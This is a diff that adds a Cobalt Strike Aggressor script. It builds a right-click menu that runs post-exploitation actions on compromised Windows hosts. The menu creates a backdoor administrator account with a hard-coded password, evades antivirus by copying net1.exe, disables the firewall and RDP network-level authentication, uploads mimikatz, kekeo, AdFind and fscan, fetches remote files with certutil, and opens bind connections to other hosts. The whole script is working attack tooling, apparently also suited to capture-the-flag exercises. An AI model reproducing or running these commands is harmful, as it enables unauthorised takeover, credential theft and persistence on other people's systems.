@@ -1,0 +1,137 @@
+popup beacon_bottom {
+    menu "TheOne" {
+        
+        item "search flag" {
+            local('$bid');
+            foreach $bid ($1) {
+                binput($bid, "shell dir C:\\ /s /b | findstr /i fla");
+                bshell($bid, "dir C:\\ /s /b | findstr /i fla");
+            }
+        }
+
+
+        item "添加后门用户" {
+            local('$bid');
+            foreach $bid ($1) {
+                binput($bid, "shell net user tomato a1b2c3.. /add");
+                bshell($bid, "net user tomato a1b2c3.. /add");
+                binput($bid, "shell net localgroup administrators tomato /add");
+                bshell($bid, "net localgroup administrators tomato /add");
+            }
+        }
+
+        item "绕过杀软创建后门" {
+            local('$bid');
+            foreach $bid ($1) {
+                binput($bid, "shell copy C:\\windows\\system32\\net1.exe net.txt");
+                bshell($bid, "copy C:\\windows\\system32\\net1.exe net.txt");
+                binput($bid, "shell net.txt user tomato a1b2c3.. /add");
+                bshell($bid, "net.txt user tomato a1b2c3.. /add");
+                binput($bid, "shell net.txt localgroup administrators tomato /add");
+                bshell($bid, "net.txt localgroup administrators tomato /add");
+            }
+        }
+
+        item "关闭防火墙" {
+            local('$bid');
+            foreach $bid ($1) {
+                binput($bid, "shell netsh advfirewall set allprofiles state off");
+                bshell($bid, "netsh advfirewall set allprofiles state off");
+            }
+        }
+
+        item "3389连接失败解决" {
+            local('$bid');
+            foreach $bid ($1) {
+                binput($bid, "shell reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f");
+                bshell($bid, "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f");
+            }
+        }
+
+        item "上传ADFind" {
+            local('$bid');
+            foreach $bid ($1) {
+                binput($bid, "upload AdFind.exe");
+                bupload($bid, script_resource("tools/AdFind.exe"));
+            }
+        }
+
+        item "上传mimikatz" {
+            local('$bid');
+            foreach $bid ($1) {
+                binput($bid, "upload mimikatz.exe");
+                bupload($bid, script_resource("tools/mimikatz.exe"));
+            }
+        }
+
+        item "上传kekeo" {
+            local('$bid');
+            foreach $bid ($1) {
+                binput($bid, "upload kekeo.exe");
+                bupload($bid, script_resource("tools/kekeo.exe"));
+            }
+        }
+
+        menu "上传Fscan" {
+            item "Linux" {
+                local('$bid');
+                foreach $bid ($1) {
+                    binput($bid, "upload fscan-linux");
+                    bupload($bid, script_resource("tools/fscan-linux"));
+                }
+            }
+            item "Windows" {
+                local('$bid');
+                foreach $bid ($1) {
+                    binput($bid, "upload FScan.exe");
+                    bupload($bid, script_resource("tools/FScan.exe"));
+                }
+            }
+        }
+
+        item "下载文件" {
+            local('$bid $url');
+            foreach $bid ($1) {
+                prompt_text("请输入下载URL:", "", lambda({
+                    local('$url');
+                    $url = $1;
+                    if ($url ne "") {
+                        binput($bid, "shell certutil -urlcache -split -f $url");
+                        bshell($bid, "certutil -urlcache -split -f $url");
+                    }
+                    else {
+                        berror($bid, "URL不能为空");
+                    }
+                }, $bid => $bid));
+            }
+        }
+    }
+}
+
+popup beacon_top {
+    item "Bind连接" {
+        local('$bid');
+        foreach $bid ($1) {
+            prompt_text("请输入IP:", "", lambda({
+                local('$ip');
+                $ip = $1;
+                if ($ip ne "") {
+                    prompt_text("请输入监听器端口:", "", lambda({
+                        local('$port');
+                        $port = $1;
+                        if ($port ne "") {
+                            binput($bid, "connect $ip $port");
+                            input("connect $ip $port", $bid);
+                        }
+                        else {
+                            berror($bid, "端口不能为空");
+                        }
+                    }, $bid => $bid, $ip => $ip));
+                }
+                else {
+                    berror($bid, "IP不能为空");
+                }
+            }, $bid => $bid));
+        }
+    }
+}
